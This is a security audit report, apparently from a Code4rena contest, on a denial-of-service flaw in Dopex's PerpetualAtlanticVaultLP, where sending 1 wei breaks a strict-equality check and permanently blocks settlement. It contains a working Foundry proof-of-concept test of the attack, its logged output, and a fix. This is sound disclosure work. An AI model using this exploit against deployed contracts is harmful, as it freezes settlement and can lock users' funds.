# Dopex

The code under review can be found in [2023-08-dopex](https://github.com/code-423n4/2023-08-dopex).

## Findings Summary

| ID                                                                                                                                                                                        | Title                                                                                                 | Summary |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------- | ------- |
| [H-01](https://github.com/kazantseff/audits/blob/main/contests/2023-08-dopex.md#m-01-substractloss-function-in-perpetualatlanticvaultlp-can-revert-and-cause-the-settlement-proccess-dos) | `substractLoss` function in PerpetualAtlanticVaultLP can revert and cause the settlement proccess DoS | High    |

## [H-01] `substractLoss` function in PerpetualAtlanticVaultLP can revert and cause the settlement proccess DoS

### Vulnerability Details

The `substractLoss()` function of PerpetualAtlanticVaultLP is called in the settlement proccess of PerpetualAtlanticVault and can revert and cause DoS if the malicious user sends 1 wei of collateral to the PerpetualAtlanticVaultLP.
When calling `settle()` in PerpetualAtlanticVault few actions are made:

1.  The collateral is transfered from PerpetualAtlanticVaultLP:

```solidity
 collateralToken.safeTransferFrom(
     addresses.perpetualAtlanticVaultLP,
     addresses.rdpxV2Core,
     ethAmount
   );
```

2. The `substractLoss()` is invoked with ethAmount:

```solidity
IPerpetualAtlanticVaultLP(addresses.perpetualAtlanticVaultLP).subtractLoss(
    ethAmount
  );
```

The root cause of the issues is that `substractLoss()` uses strict equality in the require statement.

```solidity
require(collateral.balanceOf(address(this)) == _totalCollateral - loss,"Not enough collateral was sent out");
```

If prior to the settlement a malicious user transfers 1 wei of WETH to the PerpetualAtlanticVaultLP, this check will always fail since `collateral.balanceOf(address(this)) - ethAmount` will be greater than `_totalCollateral - ethAmount` by 1 wei.

### Impact

The settlement proccess will be DoS'ed.

### Proof Of Concept

```solidity
function testSettleRevert() public {
      // Mint weth to a malicious user
      address maliciousUser = address(1);
      weth.mint(maliciousUser, 1000 * 1e18);

      // make bond
      rdpxV2Core.bond(5 * 1e18, 0, address(this));
      rdpxV2Core.bond(1 * 1e18, 0, address(this));

      vault.addToContractWhitelist(address(rdpxV2Core));
      uint256[] memory _ids = new uint256[](1);

      _ids[0] = 0;
      rdpxPriceOracle.updateRdpxPrice(1e7);
      // the vault balance before attack
      console.log(
          "VaultLp Balance Before attack: ",
          weth.balanceOf(address(vaultLp))
      );
      console.log(
          "VaultLp _totalCollateral before Attack",
          vaultLp.totalCollateral()
      );

      // send 1 wei to PerpetualAtlanticVaultLp
      vm.prank(maliciousUser);
      weth.transfer(address(vaultLp), 1);
      // balance after malicious user transfered 1 wei
      console.log(
          "VaultLp Balance After Attack: ",
          weth.balanceOf(address(vaultLp))
      );
      console.log(
          "VaultLp _totalCollateral after Attack",
          vaultLp.totalCollateral()
      );
      // the settlement reverts due to the check in PerpetualAtlanticVaultLP
      vm.expectRevert("Not enough collateral was sent out");
      rdpxV2Core.settle(_ids);

      // Skip 8 days to call PerpetualAtlanticVault.updateFundingPaymentPointer() to invoke addProceeds()
      skip(691200);
      vault.updateFundingPaymentPointer();
      // The balance is now updated as well as collateral becuase of the addProceeds() function
      console.log(
          "VaultLp Balance After addProceeds() is called: ",
          weth.balanceOf(address(vaultLp))
      );
      console.log(
          "VaultLp _totalCollateral after addProceeds() is called",
          vaultLp.totalCollateral()
      );
      vm.expectRevert("Not enough collateral was sent out");
      // But the settle is still reverting
      rdpxV2Core.settle(_ids);

      // trying to use deposit to fix the issue
      vaultLp.deposit(1e18, address(msg.sender));
      console.log(
          "VaultLp Balance After deposit() is called: ",
          weth.balanceOf(address(vaultLp))
      );
      console.log(
          "VaultLp _totalCollateral after deposit() is called",
          vaultLp.totalCollateral()
      );

      vm.expectRevert("Not enough collateral was sent out");
      // But the settle is still reverting
      rdpxV2Core.settle(_ids);
  }

```

The output of the state:

```
VaultLp Balance Before attack: 100000000000000000000
VaultLp _totalCollateral Before Attack 100000000000000000000

VaultLp Balance After Attack: 100000000000000000001
VaultLp _totalCollateral After Attack 100000000000000000000

VaultLp Balance After addProceeds() is called: 100367540499850000000
VaultLp _totalCollateral after addProceeds() is called 100367540499849999999

VaultLp Balance After deposit() is called: 101367540499850000000
VaultLp _totalCollateral after deposit() is called 101367540499849999999
```

As you can see `_totalCollateral` is always 1 wei lesser than contract balance.

### Recommended Mitigation Steps

Either remove the require check or make it less strict:

```diff
- require(collateral.balanceOf(address(this)) == _totalCollateral - loss,"Not enough collateral was sent out");
+ require(collateral.balanceOf(address(this)) >= _totalCollateral - loss,"Not enough collateral was sent out");
```
